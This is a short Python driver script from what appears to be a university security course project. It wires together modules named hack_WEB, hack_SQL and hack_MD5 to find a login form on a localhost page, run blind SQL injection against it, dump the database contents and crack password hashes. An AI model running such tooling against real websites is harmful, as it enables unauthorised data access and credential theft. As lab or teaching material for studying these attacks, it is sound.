'''
Python 3.8.2
Programming and Security
Polytechnic Institute of Guarda
'''

from src.lib.others.validator.url import url
from src.lib.others.validator.basic import opc
from src.lib.others.guide import console
from src.lib.algorithm.app import App
from src.lib.algorithm.hack_WEB import hack_WEB
from src.lib.algorithm.hack_SQL import hack_SQL
from src.lib.algorithm.hack_MD5 import decrypt, main
import pathlib
import json
import time

MAXPASSWORDSIZE = 25 # SET LIMIT PASSWORD

def smart_path(dir = ''):
    all_path = str(pathlib.Path(__file__).parent.absolute()).lower()
    dir_path = str(pathlib.Path().absolute()).lower()
    path = all_path.replace(dir_path,'')
    path = path.replace('\\', '/')[1:]
    if len(path)>0:
        path = path+'/'
    return path+dir

# r = console({
#     'ask': [
#         [
#             'Please tell us the vulnerable webpage? ',
#             'Please choose algorithm type [1 - Wordlist | 2 - Bruteforce]? '
#         ],
#         [
#             ['\n*** Incorrect website! ***', url],
#             ['\n*** Invalid option ***', opc]
#         ]
#     ]
# }).log()

r = ['http://localhost/login.php', '1']

#DEFINE ALL PROPERTY
hw = hack_WEB({
    'app_token' : '<hack-info>',
    'url_website' : r[0],
    'len_password' : MAXPASSWORDSIZE,
    'dir_hashes' : smart_path('src/data/hashes.json'),
    'dir_bruteforce' : smart_path('src/data/bruteforce.json'),
    'dir_wordlist' : smart_path('src/data/wordlist.json'),
    'dir_rainbowtable' : smart_path('src/data/rainbowtable.json'),
    'dir_dictionary' : smart_path('src/data/dictionary.json'),
    'dir_knownquery' : smart_path('src/data/sqlBlind/KnownQueries.json'),
    'dir_excludeddatabase' : smart_path('src/data/sqlBlind/ExcludedDB.json'),
    'dir_queryinject' : smart_path('src/data/sqlBlind/sqlqueries.json'),
    'dir_querypiece' : smart_path('src/data/sqlBlind/sqlslicequery.json')
})
obj = hw.HTMLformOBJ()
obj = hw.injectSQL(obj)

if len(obj) > 0:
    #print( "\nWe found: " + str(obj) )
    hs = hack_SQL(obj)
    obj = hs.findAllData()
    if len(obj) > 0:
        print( "\nWe found: " + str(obj) )